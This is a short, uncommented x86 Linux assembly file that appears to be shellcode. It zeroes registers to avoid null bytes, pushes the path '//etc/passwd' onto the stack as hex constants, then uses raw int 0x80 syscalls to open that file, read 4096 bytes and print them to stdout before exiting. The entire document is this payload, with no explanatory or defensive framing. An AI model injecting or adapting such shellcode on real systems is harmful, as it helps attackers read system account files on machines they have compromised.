.global _main


_main:

	xor    %ecx,%ecx
        xor    %eax,%eax
        xor    %edx,%edx
        push   %ecx
        mov    $0x5,%al
        push   $0x64777373
        push   $0x61702f63
        push   $0x74652f2f
        mov    %esp,%ebx
        int    $0x80
        mov    %ebx,%ecx
        mov    %eax,%ebx
        mov    $0x3,%al
        mov    $0xfff,%dx
        inc    %dx
        int    $0x80
        xor    %eax,%eax
        xor    %ebx,%ebx
        mov    $0x1,%bl
        mov    $0x4,%al
        int    $0x80
        xor    %eax,%eax
        mov    $0x1,%al
        int    $0x80
 
